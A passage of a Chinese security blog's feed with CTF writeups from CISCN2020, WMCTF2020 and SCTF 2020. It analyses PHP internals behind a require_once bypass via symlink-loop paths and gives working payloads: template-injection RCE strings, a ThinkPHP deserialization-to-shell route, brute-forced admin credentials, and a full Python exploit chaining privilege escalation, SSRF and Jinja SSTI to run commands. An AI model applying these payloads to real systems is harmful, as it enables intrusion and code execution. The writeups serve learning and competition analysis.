class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">trick</span>:</span><br><span class="line">    trick1 = <span class="number">1.00000000000001</span></span><br><span class="line">    trick2 = <span class="number">1.000000000000001</span></span><br><span class="line"><span class="built_in">print</span>(serialize(trick()))</span><br></pre></td></tr></table></figure><h2 id="剩下两道就放个payload吧。。">剩下两道就放个payload吧。。</h2><ul><li>rceme: 没过滤反引号 <code>?a=&#123;if:var_dump(``ls``)&#125;&#123;end if&#125;</code></li><li>easyphp: Apache收到SIGUSR1的时候会软重启 <code>?a=call_user_func&amp;b=pcntl_wait</code></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Web狗无法在险恶的CTF世界中存活&lt;/p&gt;
&lt;p&gt;CISCN2020 落幕，web所有题加起来还不如misc/crypto/re题的零头，吐了&lt;/p&gt;
&lt;h2 id=&quot;littlegame&quot;&gt;littlegame&lt;/h2&gt;
&lt;p&gt;js原型链污染，&lt;code&gt;set-val</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>PHP Lifecycle</title>
    <link href="https://blog.frankli.site/2020/08/14/Security/php-src/PHP-Lifecycle/"/>
    <id>https://blog.frankli.site/2020/08/14/Security/php-src/PHP-Lifecycle/</id>
    <published>2020-08-13T16:00:00.000Z</published>
    <updated>2021-04-11T21:37:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-生命周期">PHP 生命周期</h2><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP-生命周期&quot;&gt;PHP 生命周期&lt;/h2&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javas</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="php-src" scheme="https://blog.frankli.site/tags/php-src/"/>
    
  </entry>
  
  <entry>
    <title>PHP函数、Opcode与注册表</title>
    <link href="https://blog.frankli.site/2020/08/14/Security/php-src/PHP-Registry-Mechanism/"/>
    <id>https://blog.frankli.site/2020/08/14/Security/php-src/PHP-Registry-Mechanism/</id>
    <published>2020-08-13T16:00:00.000Z</published>
    <updated>2021-04-11T21:37:14.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.frankli.site/2020/08/05/WMCTF2020-PHP-source-analysis/">上一篇</a>需要一些基础知识。本篇blog除介绍这些基础知识外还会进行一些扩展，说一说PHP的其它内部原理。</p><h2 id="哈希表">哈希表</h2><p>PHP在编写过程中大量使用了哈希表数据结构进行内部的处理。<br>DJBX33A</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.frankli.site/2020/08/05/WMCTF2020-PHP-source-analysis/&quot;&gt;上一篇&lt;/a&gt;需要一些基础知识。本篇blog除介绍这些基础知识外还会进行一些扩展，说一说PHP的其它内部原理。&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="php-src" scheme="https://blog.frankli.site/tags/php-src/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF2020 PHP source analysis</title>
    <link href="https://blog.frankli.site/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/"/>
    <id>https://blog.frankli.site/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/</id>
    <published>2020-08-04T16:00:00.000Z</published>
    <updated>2021-04-11T21:39:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>WMCTF 2020中<a href="https://zhaoj.in">赵师傅</a>出了一道PHP源码审计 <code>Make PHP Great Again</code>。<br>比赛中没有做出来，非常遗憾。</p><p>作为一个赛后诸葛亮，趁着赵师傅还没发官方分析，在此水一篇博客分析分析题目</p><h2 id="什么事require-once">什么事require_once</h2><p>as always，先看<a href="https://www.php.net/manual/en/function.require-once.php">文档</a><br><code>require_once</code>在功能上与<code>require</code>一致，只是对于任意文件都只会包含一次，而<code>require</code>在正常情况下又与<code>include</code>的功能一致。<br>又到了日常骂文档的时间：<code>require_once</code>的文档告诉我们要到<code>include_once</code>的文档中查看<code>_once</code>的行为（<code>See the include_once documentation for information about the _once behaviour</code>），而<code>include_once</code>又说了几句废话带过去了（<code>As the name suggests, the file will be included just once.</code>）。8愧事PHP</p><h2 id="源码分析">源码分析</h2><h3 id="Entry">Entry</h3><p>很多人会误以为require/include系列是函数，然而文档都写得很清楚了它们实际上是<code>statement</code>，语句，所以它们并没有通过<code>PHP_FUNCTION</code>宏注册于PHP的函数注册表中。这样的<code>statement</code>总共只有五个，分别是<code>include[_once]</code>、<code>require[_once]</code>与<code>eval</code>。</p><p>在<code>Zend/zend_vm_opcodes.h</code>中我们可以找到，<code>require/include</code>的opcode是73</p><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/opcode.png" class="" title="ZEND_INCLUDE_OR_EVAL"><p>而在<code>Zend/zend_vm_def</code>中我们可以看到</p><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/handler.png" class="" title="ZEND_VM_HANDLER"><p>可以看到，这个handler的核心在于<code>zend_include_or_eval</code>，接下来我们就从这个函数开始进一步分析</p><h3 id="zend-include-or-eval">zend_include_or_eval</h3><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/resolve.png" class="" title="zend_resolve_path"><p><code>zend_resolve_path</code>是php API的一部分，也就是说是动态赋值的。<br>很容易就会发现在<code>zend_startup</code>步骤中出现了<br><code>zend_resolve_path = utility_functions-&gt;resolve_path_function;</code><br>这样的语句，交叉引用看到<code>main.c</code>中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">php_module_startup</span><span class="params">(sapi_module_struct *sf, zend_module_entry *additional_modules, <span class="type">uint32_t</span> num_additional_modules)</span></span>&#123;</span><br><span class="line">    zend_utility_functions zuf;</span><br><span class="line">    ...</span><br><span class="line">    zuf.resolve_path_function = php_resolve_path_for_zend;</span><br><span class="line">    <span class="built_in">zend_startup</span>(&amp;zuf);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终找到&quot;真正&quot;的<code>zend_resolve_path</code>函数，然后再琢磨一会才能找到<code>tsrm_realpath_r</code>，但是实际上这里正常的做法是动态调试。<br>在<code>zend_include_or_eval</code>中下断点，下在<code>zend_resolve_path</code>处，单步进入，会发现实际上走到了<code>phar_find_in_include_path</code>，原因是phar拓展拦截了<code>zend_resolve_path</code>函数（装饰器设计模式）。不过没关系，我们还是fallback到了<code>php_resolve_path_for_zend</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PHP_MINIT_FUNCTION</span>(phar)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">REGISTER_INI_ENTRIES</span>();</span><br><span class="line"></span><br><span class="line">    phar_orig_compile_file = zend_compile_file;</span><br><span class="line">    zend_compile_file = phar_compile_file;</span><br><span class="line"></span><br><span class="line">    phar_save_resolve_path = zend_resolve_path;</span><br><span class="line">    zend_resolve_path = phar_resolve_path;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">phar_object_init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">phar_intercept_functions_init</span>();</span><br><span class="line">    <span class="built_in">phar_save_orig_functions</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">php_register_url_stream_wrapper</span>(<span class="string">&quot;phar&quot;</span>, &amp;php_stream_phar_wrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟啊跟，最终跟到<code>tsrm_realpath_r</code>。但是<code>tsrm_realpath_r</code>这么长不太想看怎么办？<br>别忘了我们是在动态调试。让我们先看看执行的效果如何</p><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/noexception.png" class="" title="what?"><p><code>tsrm_realpath</code>返回了NULL。看上去没问题，但是让我们回到<code>zend_include_or_eval</code>。按照开发者的逻辑，<code>tsrm_realpath</code>返回NULL意味着出现了问题，理应抛出一个异常（在PHP中为<code>execute_globals.exception</code>，即<code>EG(exception)</code>），然而纵观源码，此处并没有调用<code>zend_throw_exception</code>抛出异常。</p><p>所以我们直接走到了<code>zend_stream_open</code>。这时我们遇到了另一个PHP_API，参考<code>zend_resolve_path</code>，我们能够找到&quot;真正的&quot;<code>zend_stream_open</code>为<code>php_stream_open_for_zend</code>。可以看到它对<code>php_stream_open_wrapper</code>进行了包装，而<code>wrapper</code>又是一个指向<code>_php_stream_open_wrapper_ex</code>(main/streams/streams.c:2057)的宏</p><p>跟进来，仍然有对<code>zend_resolve_path</code>的调用</p><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/stream_open.png" class="" title="梅开二度"><p>梅开二度，仍然返回NULL，没抛Exception。我们跟到<code>main/streams/plain_wrapper.c</code>中看文件是如何打开的：</p><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/open_wrapper.png" class=""><p>也就是说需要经过一次<code>expand_filepath</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="type">char</span> *<span class="title">expand_filepath</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filepath, <span class="type">char</span> *real_path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">expand_filepath_ex</span>(filepath, real_path, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PHPAPI <span class="type">char</span> *<span class="title">expand_filepath_ex</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filepath, <span class="type">char</span> *real_path, <span class="type">const</span> <span class="type">char</span> *relative_to, <span class="type">size_t</span> relative_to_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">expand_filepath_with_mode</span>(filepath, real_path, relative_to, relative_to_len, CWD_FILEPATH);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PHPAPI <span class="type">char</span> *<span class="title">expand_filepath_with_mode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filepath, <span class="type">char</span> *real_path, <span class="type">const</span> <span class="type">char</span> *relative_to, <span class="type">size_t</span> relative_to_len, <span class="type">int</span> realpath_mode)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">virtual_file_ex</span>(&amp;new_state, filepath, <span class="literal">NULL</span>, realpath_mode)) &#123;</span><br><span class="line">        <span class="built_in">efree</span>(new_state.cwd);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里怎么也有个<code>virtual_file_ex</code>？我们继续走</p><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/expand_virtual.png" class=""><p>竟然顺利通过了。所以我们可以得出一个小结论：是<code>virtual_file_ex</code>的不一致的表现导致了这个bug。<br>我们进一步来探讨一下这个不一致性是怎么产生的。</p><h3 id="virtual-file-ex">virtual_file_ex</h3><p>在上面的分析中，可以看到<code>tsrm_realpath</code>与<code>expand_filepath</code>在调用<code>virtual_file_ex</code>分别是这么传参的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tsrm_realpath</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">virtual_file_ex</span>(&amp;new_state, path, <span class="literal">NULL</span>, CWD_REALPATH)) &#123;...&#125;</span><br><span class="line"><span class="comment">// expand_filepath</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">virtual_file_ex</span>(&amp;new_state, path, <span class="literal">NULL</span>, CWD_FILEPATH)) &#123;...&#125;</span><br></pre></td></tr></table></figure><p>这两个宏在源码里是这么解释的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CWD_FILEPATH 1 <span class="comment">/* resolve symlinks if file is exist otherwise expand */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CWD_REALPATH 2 <span class="comment">/* call realpath(), resolve symlinks. File must exist */</span></span></span><br></pre></td></tr></table></figure><p>二者的区别在于REALPATH调用时必须<strong>保证</strong>文件存在，不然就会直接返回</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (save &amp;&amp; <span class="built_in">php_sys_lstat</span>(path, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (use_realpath == CWD_REALPATH) &#123;</span><br><span class="line">        <span class="comment">/* file not found */</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="type">size_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* continue resolution anyway but don&#x27;t save result in the cache */</span></span><br><span class="line">    save = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lstat">lstat</h3><p>等等，它是怎么判断文件是否存在的？<code>php_sys_lstat</code>是什么？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> php_sys_lstat lstat</span></span><br></pre></td></tr></table></figure><p>也就是说只要<code>lstat(path)</code>小于0，PHP就会认为文件不存在，从而<code>virtual_file_ex(..., CWD_REALPATH)</code>，即<code>tsrm_realpath</code>会出问题，而<code>virtual_file_ex(..., CWD_FILEPATH)</code>虽然&quot;找不到&quot;这个文件，但仍然会返回一个合法的路径。<br>我们再仔细看看<a href="https://linux.die.net/man/3/lstat">lstat在什么情况下会报错</a></p><p>其中有一条就很有趣：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The lstat() function may fail if:</span><br><span class="line"></span><br><span class="line">ELOOP</span><br><span class="line">    More than &#123;SYMLOOP_MAX&#125; symbolic links were encountered</span><br><span class="line">    during resolution of the path argument.</span><br></pre></td></tr></table></figure><p>在网上查阅了大半个世纪，所有人都说这是通过sysconf动态赋值的，只要满足不小于POSIX规定的8即可。可是我找到了一件很搞笑的事情：</p><p><a href="https://github.com/torvalds/linux/search?q=MAXSYMLINKS&amp;unscoped_q=MAXSYMLINKS">https://github.com/torvalds/linux/search?q=MAXSYMLINKS&amp;unscoped_q=MAXSYMLINKS</a></p><img src="/2020/08/05/Security/php-src/WMCTF2020-PHP-source-analysis/eloop.png" class=""><p>无敌的Linux竟然是把这个值写死成40的，nb，属实nb</p><p>至此，我们有了一个payload，即<code>&quot;/proc/self/root&quot;*21+/flag</code></p><p>payload中：<code>/proc/self/root</code>提供了两层symlink（<code>/proc/self</code>指向<code>/proc/[pid]</code>），也就是说重复21次我们将得到42层symlink，比lstat能够处理的层数多出两层。</p><h2 id="总结">总结</h2><ul><li>在软件开发的过程中，要有一个统一的异常处理机制，不要一会返回0，一会抛异常的</li><li>要和一起写代码的沟通好，写好文档（其实<code>virtual_file_ex</code>上面注释里写了，返回0是正常，1是有错，我估计调用的人就没好好看（逃））</li><li>要保证一个操作的一致性，比如这个<code>require_once</code>就因为内部前后不一致导致了绕过</li></ul><h2 id="备注">备注</h2><ul><li>源码分析基于PHP 7.4.5，截止<a href="https://github.com/php/php-src/blob/44ad2db15fe786b07ce793624885e0c43e0af897/Zend/zend_virtual_cwd.c#L885">8.0.0-beta1</a> php 仍然使用lstat的返回值作为文件是否存在的依据</li><li>在源码分析的过程中还有一个地方可能导致类似的问题，有兴趣的自己看，此处不点明（</li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;WMCTF 2020中&lt;a href=&quot;https://zhaoj.in&quot;&gt;赵师傅&lt;/a&gt;出了一道PHP源码审计 &lt;code&gt;Make PHP Great Again&lt;/code&gt;。&lt;br&gt;
比赛中没有做出来，非常遗憾。&lt;/p&gt;
&lt;p&gt;作为一个赛后诸葛亮，趁着赵师傅还没发官</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
    <category term="php-src" scheme="https://blog.frankli.site/tags/php-src/"/>
    
  </entry>
  
  <entry>
    <title>SCTF 2020 两道Web题 Writeup</title>
    <link href="https://blog.frankli.site/2020/07/07/Security/Writeup/SCTF-2020-Web/"/>
    <id>https://blog.frankli.site/2020/07/07/Security/Writeup/SCTF-2020-Web/</id>
    <published>2020-07-06T16:00:00.000Z</published>
    <updated>2025-10-19T20:33:31.484Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UnsafeDefenseSystem">UnsafeDefenseSystem</h2><p>PHP/5.6.26, tp 5.0.24<br>经过一番吐血的信息搜集，看到了这个破静态站的源码里竟然有注释</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/hint.png" class="" title="hint in comment"><blockquote><p>我要对出题人使出极限一换一</p></blockquote><p>访问/protect.py能看到一个超长的憨批监控脚本，其实也不用看<br>在静态站注释提示的/public/nationalsb/login.php的注释中又看到了关于密码的提示</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/passwd_hint.png" class="" title="passwd_hint"><p>通过爆破得到用户名密码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Admin1964752</span><br><span class="line">DsaPPPP!@#amspe1221</span><br></pre></td></tr></table></figure><p>后台存在lfi。经过一番读文件，看到index controller中存在反序列化点</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/entry.png" class="" title="unserialize entry"><p>结合上文所知道的thinkphp版本可以搜到:</p><p><a href="https://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">https://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/</a><br><a href="https://xz.aliyun.com/t/7594">https://xz.aliyun.com/t/7594</a></p><p><a href="http://xn--protect-gq4kgoltk9x2jgvm3c8kpghez02h8zvad37bkmqos5b.py">出题人可能是想让条件竞争过protect.py</a>，但是实际上我们可以往/tmp目录底下写文件，并且在nationalsb那里包含这一文件，最终拿到shell</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/phpinfo.png" class="" title="phpinfo"><h2 id="jsonhub">jsonhub</h2><p>白盒审计。对外开放的是web1，一个Django服务，内网还有个flask。</p><p>首先整理思路：首先要过那个django的token，然后ssrf请求flask_rpc，这样才能带上Content-Type发POST请求</p><img src="/2020/07/07/Security/Writeup/SCTF-2020-Web/create_user.png" class="" title="User creation flaw"><p>很明显，注册的时候参数完全可控，也就是说可以伪造管理员身份。将两个字段，<code>is_superuser</code>与<code>is_staff</code>都设置为True，就能访问 <code>http://39.104.19.182/admin/app/token/</code> 拿到token了。</p><p>在请求后方flask服务前，django服务对<code>REMOTE_URL</code>进行了验证。由于题目部署在了docker里，访问公网ip时<code>REMOTE_URL</code>实际上是172.多少多少（即使不在docker里也是公网ip）。</p><p><a href="https://xz.aliyun.com/t/3302">https://xz.aliyun.com/t/3302</a><br>利用CVE-2018-14574漏洞进行跳转即可</p><p>再看第二个服务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    data = <span class="built_in">str</span>(request.data)</span><br><span class="line">    log()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;&#123;%&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;%&#125;&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        abort(<span class="number">401</span>)</span><br><span class="line">...</span><br><span class="line">    json.loads(...)</span><br></pre></td></tr></table></figure><p>python中的json模块在解析json时会自动将转义过的字符恢复，所以可以用<code>&quot;\u007b&quot;</code>来绕过<code>before_request</code><br>关于表达式的正则过滤，由于对符号的过滤不严格导致了一个非预期，甚至完全不需要管num1和num2：</p><p>exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, session, get, post</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">HOST = <span class="string">&#x27;http://39.104.19.182&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line">USER = <span class="string">&#x27;frkasdf&#x27;</span></span><br><span class="line">PASS = <span class="string">&#x27;qwer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># session 默认keep-alive，这个服务端好像有点连接性问题，所以单独请求</span></span><br><span class="line">post(HOST + <span class="string">&#x27;/reg/&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: USER,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: PASS,</span><br><span class="line">    <span class="string">&#x27;is_staff&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&#x27;is_superuser&#x27;</span>: <span class="literal">True</span></span><br><span class="line">&#125;).json()[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ses.post(HOST + <span class="string">&#x27;/login/&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: USER,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: PASS,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">page = BeautifulSoup(get(</span><br><span class="line">    HOST + <span class="string">&#x27;/admin/app/token/&#x27;</span>, cookies=ses.cookies</span><br><span class="line">).text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">token = page.find(<span class="string">&#x27;td&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;field-Token&#x27;</span>&#125;).text</span><br><span class="line"></span><br><span class="line">ssti = <span class="string">&#x27;&#123;&#123;config.__class__.__init__.__globals__[&quot;os&quot;].popen(&quot;/readflag&quot;).read() + &quot;&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="string">&#x27;&#123;&#x27;</span> + json.dumps(&#123;</span><br><span class="line">    <span class="string">&#x27;num1&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;num2&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;symbols&#x27;</span>: ssti,</span><br><span class="line">&#125;)[<span class="number">1</span>:-<span class="number">1</span>].replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\\u007b&#x27;</span>).replace(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\\u007d&#x27;</span>) + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b64encode(payload.encode()).decode()</span><br><span class="line"></span><br><span class="line">req = Request(<span class="string">&#x27;GET&#x27;</span>, HOST + <span class="string">&#x27;//127.0.0.1:8000/flask_rpc&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;methods&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;http://localhost:5000/caculator&#x27;</span>,</span><br><span class="line">    <span class="comment"># flask在:5000</span></span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: payload</span><br><span class="line">&#125;).prepare()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.loads(ses.post(HOST + <span class="string">&#x27;/home/&#x27;</span>, json=&#123;</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: req.url,</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">&#125;).json()[<span class="string">&#x27;message&#x27;</span>])[<span class="string">&#x27;message&#x27;</span>])</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;UnsafeDefenseSystem&quot;&gt;UnsafeDefenseSystem&lt;/h2&gt;
&lt;p&gt;PHP/5.6.26, tp 5.0.24&lt;br&gt;
经过一番吐血的信息搜集，看到了这个破静态站的源码里竟然有注释&lt;/p&gt;
&lt;img src=&quot;/2020/07/07/</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.frankli.site/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>关于爱</title>
    <link href="https://blog.frankli.site/2020/05/20/Misc/%E5%85%B3%E4%BA%8E%E7%88%B1/"/>
    <id>https://blog.frankli.site/2020/05/20/Misc/%E5%85%B3%E4%BA%8E%E7%88%B1/</id>
    <published>2020-05-19T16:00:00.000Z</published>
    <updated>2025-10-19T20:41:16.255Z</updated>
    
